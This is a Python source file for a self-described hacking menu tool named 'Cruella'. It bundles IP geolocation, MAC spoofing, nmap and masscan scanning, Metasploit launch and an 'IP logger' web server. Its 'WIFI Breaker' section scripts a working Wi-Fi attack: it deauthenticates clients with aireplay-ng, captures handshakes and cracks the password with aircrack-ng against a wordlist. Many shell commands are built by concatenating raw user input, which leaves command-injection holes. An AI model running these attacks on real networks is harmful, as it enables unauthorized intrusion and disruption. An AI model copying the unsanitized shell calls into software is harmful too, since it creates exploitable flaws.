#by steel99xl
#yes i know this is a complete fucking mess
#truest me it only gets worse from here
from urllib.request import urlopen
import platform
import os
import webbrowser
import time
global Mac
global OS
global Windows
global Latitude
global Longitude
global Yes
global yes
global Geo
global Domains
global External_IP
global Terminal
global Address
global Metasploit
global WebServer
global Scan
global Quit
global No
global B
global GoogleApiKey
GoogleApiKey = ""
# You need to imput your own Google API Key to use the Address Print out (not the map link)
Latitude = ""
Geo = "1"
Domains = "2"
Address = "3"
External_IP = "4"
Terminal = "5"
Metasploit = "6"
Mac = "7"
WebServer = "8"
Scan = "9"
Wifi = "10"
Quit = "11"
Yes = "Y"
yes = "y"
No = "N"
OS = platform.system()
Windows = "Windows" # Its esayer just check windows and if its not have its default to a Unix OS
B = "" #This is just used as a blank variable to temporary store variables
if(OS == Windows):
    os.system("cls")
else:
    os.system("clear")
print("")
print(" $$$$$$\                                $$\ $$\           ")
print("$$  __$$\                               $$ |$$ |          ")
print("$$ /  \__| $$$$$$\  $$\   $$\  $$$$$$\  $$ |$$ | $$$$$$\  ")
print("$$ |      $$  __$$\ $$ |  $$ |$$  __$$\ $$ |$$ | \____$$\ ")
print("$$ |      $$ |  \__|$$ |  $$ |$$$$$$$$ |$$ |$$ | $$$$$$$ |")
print("$$ |  $$\ $$ |      $$ |  $$ |$$   ____|$$ |$$ |$$  __$$ |")
print("\$$$$$$  |$$ |      \$$$$$$  |\$$$$$$$\ $$ |$$ |\$$$$$$$ |")
print(" \______/ \__|       \______/  \_______|\__|\__| \_______|")
print(" ")
#print(" WARRNING THE ANSWERS OF (Y/N) ARE CASE SENSITIVE FOR (Y)") Woo no longer case sensitive :)

while True:
    def geo():
        global Latitude
        global Longitude
        print("Enter a website or IP")
        IP = input("IP/WEBSITE: " )
        body = str(urlopen("http://api.hackertarget.com/geoip/?q="+ IP).read())
        print (body)
        C = body.find("Latitude")
        C += 10
        D = C + 9
        Latitude = body[C:D]
        body = str(urlopen("http://api.hackertarget.com/geoip/?q="+ IP).read())
        C = body.find("Longitude")
        C += 12
        D = C + 9
        Longitude = body[C:D]
        print("")
        print("")

    def domains():

        print("Enter website with out www. to get full out put")
        print("Warnning may have massive output")

        site = input("WEBSITE: " )
        body = urlopen("http://api.hackertarget.com/dnslookup/?q="+ site)

        write = input("Do you want the ouput sent to a file?(Y/N): ")
        if(write==Yes or write == yes):
            f = open("OwnedHosts.txt", "w+")
            f.write(body)
            f.close()
        else:
            print(body)
            print(" ")
            print(" ")


    def address():
        global Latitude
        global Longitude
        if(Latitude==""):
            print(" ")
            #global Latitude
            #global Longitude
            print("Enter a website or IP")
            IP = input("IP/WEBSITE: " )
            body = str(urlopen("http://api.hackertarget.com/geoip/?q="+ IP).read())
            print (body)
            C = body.find("Latitude")
            C += 10
            D = C + 9
            Latitude = body[C:D]
            body = str(urlopen("http://api.hackertarget.com/geoip/?q="+ IP).read())
            C = body.find("Longitude")
            C += 12
            D = C + 9
            Longitude = body[C:D]
            print("")
            print("")
        else:
            pass

        link = input("Would you like to open Google Maps?(Y/N): ")
        if(link==Yes or link == yes):
            link = input("Would you like direction to the location?(Y/N): ")
            if(link==Yes or link == yes):
                url = ("https://www.google.com/maps/dir/?api=1&query=" + Latitude +","+ Longitude)
                webbrowser.open_new_tab(url)
                print(" ")
            else:
                url = ("https://www.google.com/maps/search/?api=1&query=" + Latitude +","+ Longitude)
                webbrowser.open_new_tab(url)
                print(" ")
                #print(url) #Debug Output
        else:
            print(Latitude)
            print(Longitude)
            #B = (Latitude+","+Longitude +"&key="+ GoogleApiKey)
            #body = urlopen("https://maps.googleapis.com/maps/api/geocode/json?latlng="+B)
            #print (body.read())
            #B = ""

    def external_ip():
        print("")
        print("External IP:")
        print("------------")
        if(OS == Windows):
            os.system("nslookup myip.opendns.com. resolver1.opendns.com")
            # External IP check for Windows
        else:
            os.system("dig +short myip.opendns.com @resolver1.opendns.com")
            # External IP check of every OS except for Windows
        print("------------")
        print("")

    def terminal():
        print("")
        print("type 'exit' to get back to tools")
        if(OS == Windows):
            os.system("start cmd") # External IP check for Windows
        else:
            os.system("bash")
        print("")

    def metasploit():
        B = input("Would you like to update metasploit befor running (Y/N)")
        if(B == Yes or B == yes):
            print("Switching to root to update")
            os.system("sudo msfupdate")
            os.system("msfconsole")
        else:
            print("Launching Metasploit")
            os.system("msfconsole")

    def mac():
        print("Swtiching to randomly generated Mac Address")
        C = input("Please enter interface name (wlan0): ")
        os.system("sudo ifconfig " + C + " down")
        os.system("sudo openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'| xargs sudo ifconfig " + C + " hw ether")
        os.system("sudo ifconfig " + C + " up")
        os.system("ifconfig " + C +" | grep ether")

    def webserver():
        print("WARNNING THIS EXITS WITH ERRORS")

        print("To start this Web server you need to answer some questions")
        print("")
        IP = input("Please enter your internal or external IP : ")
        print("")
        print("Warning can only point to a file in a lower directory")
        print("")
        DIR = input("Please enter the path for the file : ")
        print("")
        Port = input("Please enter the port you want to use : ")
        print("")
        print("Generating custom link")
        print("---------")
        print(str(IP) + ":" + str(Port) + DIR)
        print("---------")
        time.sleep(2)
        print("")
        print("STARTIN WEB SERVER")
        print("")
        os.system("sudo python -m SimpleHTTPServer " + Port)
        print("\n")
        print("\n")
    def scan():
        print("Presission Scan V.S. Mass Scan?")
        print("The Presission Scan finds open ports on a system while the  Mass Scan finds system with specified ports open")
        B = input("Do you want a Presission scan or a Mass Scan? (P/M)")
        if(B == "P" or  B == "p"):
            print("Please enter the ip addres you want to scan")
            print("use '*' to scan every possibe one EX : 192.168.1.*")
            C = input("(192.168.1.1): ")
            B = input("Would you like this save to a file on your Desktop? (Y/N)")
            if(B == "Y" or B == "y"):
                os.system("nmap -T4 -A -vv "+C+" > ~/Desktop/Scan_Results.txt")
            else:
                os.system("nmap -T4 -A -vv "+ C)
        else:
            print("Please enter the ip range you want to scan")
            print("use '*' to scan every possibe one EX : 10.0.0.0/8")
            C = input("(10.0.0.0/8): ")
            print("to enter multiple ports use a ',' EX '80,21,22'")
            print("if you want a range of ports use '-' EX ' 8000-8100'")
            P = input("Please Enter a Port(s) number to scan on : ")
            B = input("Would you like this save to a file on your Desktop? (Y/N)")
            if(B == "Y" or B == "y"):
                os.system("massscan -p"+P+" " +C+" > ~/Desktop/Scan_Results.txt")
            else:
                os.system("massscan -p"+P+" " +C)

    def wifi():
        global ADDRESS
        global CHANNEL
        global SSID
        global PASSWORDS
        global NETWORK_CARD
        global CARD
        global LINE
        global x
        x = 1
        SSID = ""
        print(" ")
        print("WIFI_DOWN")
        print("by steel99xl")
        print(" ")
        print("Please select your WIFI device of choise")
        print("Must Support MONITOR MODE")
        print("")
        os.system("ifconfig | awk -F':' {'print $1'} |cut -d' ' -f1 |awk /./")
        print("")
        NETWORK_CARD = str(input("DEVICE : "))
    
        os.system('clear')

        while x == 1:

            def Device():
                global NETWORK_CARD
                print("Preparing to switch Network Cards")
                os.system("sudo airmon-ng stop "+ NETWORK_CARD +" sudo airmon-ng stop " +NETWORK_CARD)
                print("Please select your WIFI device of choise")
                os.system("ifconfig | awk -F':' {'print $1'} |cut -d' ' -f1 |awk /./")
                NETWORK_CARD = str(input("DEVICE : "))

            def Network():
                global ADDRESS
                global SSID
                global CHANNEL
                global LINE
                os.system("sudo iwlist "+ NETWORK_CARD+" scan > /tmp/WIFI.txt")
                os.system("cat /tmp/WIFI.txt | awk -F'ESSID:' {'print $2'} | awk /./ > /tmp/SSID.txt && cat /tmp/SSID.txt")                    
                os.system("cat /tmp/WIFI.txt  | awk -F'Address: ' {'print $2'} | awk /./ > /tmp/Address.txt")
                os.system("cat /tmp/WIFI.txt  | awk -F'Channel:' {'print $2'} | awk /./ > /tmp/Channel.txt")
                print("")
                User_SSID = input("Please enter the WIFI network name : ")
                SSID = User_SSID
                with open('/tmp/SSID.txt') as User_Readable:
                    for num, line in enumerate(User_Readable,1):
                        if User_SSID in line:
                            LINE = str(num)
                            LINE = int(LINE) - 1

                    with open('/tmp/Address.txt') as User_Address:
                        lines = User_Address.read().splitlines()
                        ADDRESS = lines[int(LINE)]

                    with open('/tmp/Channel.txt') as User_Channel:
                        lines = User_Channel.read().splitlines()
                        CHANNEL = lines[int(LINE)]

            def Monitor_Mode():
                global CARD
                global NETWORK_CARD
                NETWORK_CARD = os.system("sudo airmon-ng start "+ NETWORK_CARD +" | cut -d ']' -f3 | cut -d ')' -f1 | awk /./ > /tmp/Network_Card.txt")
                def file_len():
                    global CARD
                    with open('/tmp/Network_Card.txt') as F:
                        for CARD, l in enumerate(F):
                            pass
                    return CARD + 1
                file_len()

                with open('/tmp/Network_Card.txt') as F:
                    lines = F.read().splitlines()
                    NETWORK_CARD = lines[CARD]

                def Attack():
                    global ADDRESS
                    global CHANNEL
                    global NETWORK_CARD
                    print("do a thing.... please")
                    os.system("sudo aireplay-ng -0 100 -a "+ ADDRESS +"  "+ NETWORK_CARD +" & sudo airodump-ng --bssid "+ ADDRESS+" --channel "+ CHANNEL +" --output-format cap --write ~/Desktop/Breaker " + NETWORK_CARD)
                    print("")
                    B = input("Do you want to export the file so it can work in hashcat? (Y/N)")
                    if(B == "Y" or B == "y"):
                        os.system("aircrack-ng ~/Desktop/Breaker.cap -f hashcat")
                    else:
                        print("")
                        B = input("Would you like to strat cracking the Password(Y/N)")
                        if(B == "Y" or B == "y"):
                            Password = input("Please enter the path for your Password List: ")
                            os.system("aircrack-ng -b "+ADDRESS+" -w "+ Password+ " ~/Desktop/Breaker.cap")
                        else:
                            print("")
                

            def Menu():
                os.system("clear")
                print("")
                print("WIFI_DOWN")
                print("")
                print("WIFI_DEVICE : " + NETWORK_CARD)
                print("WIFI_NETWORK : " + SSID)
                print(" ")
                print("[1] Select Wifi Card")
                print("[2] Select Network for penitration")
                print("[3] Set to Attack mode")
                print("[4] Penitrate Specified Network")
                print("[5] Quit Wifi Breaker (return to Cruella)")
                X = input("Please Select an Option : ")
                if(X == "1"):
                    Device()
                else:
                    pass
                if(X == "2"):
                    Network()
                else:
                    pass
                if(X == "3"):
                    Monitor_Mode()
                else:
                    pass
                if(X == "4"):
                    Attack()
                else:
                    pass
                if(X == "5"):
                    global x
                    x = 0
                    print(" ")
                    os.system("clear")
                else:
                    pass

            try:
                Menu()
            except KeyboardInterrupt:
                print(" ")
                print("Seting Network Card back to Managed Mode")
                os.system("sudo airmon-ng stop "+ NETWORK_CARD +" sudo airmon-ng stop " +NETWORK_CARD)
                print("")
                os._exit(0)


    def quit():
        B = input("Do you want to quit Cruella? (Y/N) ")
        if(B == Yes or B == yes):
            print("")
            print("")
            print(" $$$$$$\            $$\   $$\     $$\ ")
            print("$$  __$$\           \__|  $$ |    \__|")
            print("$$ /  $$ |$$\   $$\ $$\ $$$$$$\   $$\ $$$$$$$\   $$$$$$\ ")
            print("$$ |  $$ |$$ |  $$ |$$ |\_$$  _|  $$ |$$  __$$\ $$  __$$\ ")
            print("$$ |  $$ |$$ |  $$ |$$ |  $$ |    $$ |$$ |  $$ |$$ /  $$ | ")
            print("$$ $$\$$ |$$ |  $$ |$$ |  $$ |$$\ $$ |$$ |  $$ |$$ |  $$ | ")
            print("\$$$$$$ / \$$$$$$  |$$ |  \$$$$  |$$ |$$ |  $$ |\$$$$$$$ | ")
            print(" \___$$$\  \______/ \__|   \____/ \__|\__|  \__| \____$$ | ")
            print("     \___|                                      $$\   $$ | ")
            print("                                                \$$$$$$  | ")
            print("                                                 \______/ ")
            print("")
            os._exit(0)
        else:
            print("")
            print("Returning to tool selcetion")
            print("")

    def main():
        #Every option bellow Terminal currently does not work on Windows
        #Except for Quit. that works on all Operating Systems
        print("[1] IP Geolocator ")
        print("[2] Owned Domains and IPs")
        print("[3] Resolve Website/IP to Address")
        print("[4] Display External IP")
        print("[5] Terminal")
        print("[6] Metasploit")
        print("[7] Change Mac Address")
        print("[8] IP Logger")
        print("[9] Network Scan")
        print("[10] WIFI Breaker")
        print("[11] Quit Cruella")
        tool = input("Select a tool: " )

        if(tool == Geo):
            geo()
        else:
            pass
        if(tool == Domains):
            domains()
        else:
            pass
        if(tool == Address):
            address()
        else:
            pass
        if(tool == External_IP):
            external_ip()
        else:
            pass
        if(tool == Terminal):
            terminal()
        else:
            pass
        if(tool == Metasploit):
            metasploit()
        else:
            pass
        if(tool == Mac):
            mac()
        else:
            pass
        if(tool == WebServer):
            webserver()
        else:
            pass
        if(tool == Scan):
            scan()
        else:
            pass
        if(tool == Wifi):
            wifi()
        if(tool == Quit):
            quit()
        else:
            pass

        print("Select a tool")
    try:
        main()
    except KeyboardInterrupt:
        print("")
        print("")
        print("Closing Cruella")
        print(" ")
        os._exit(0)
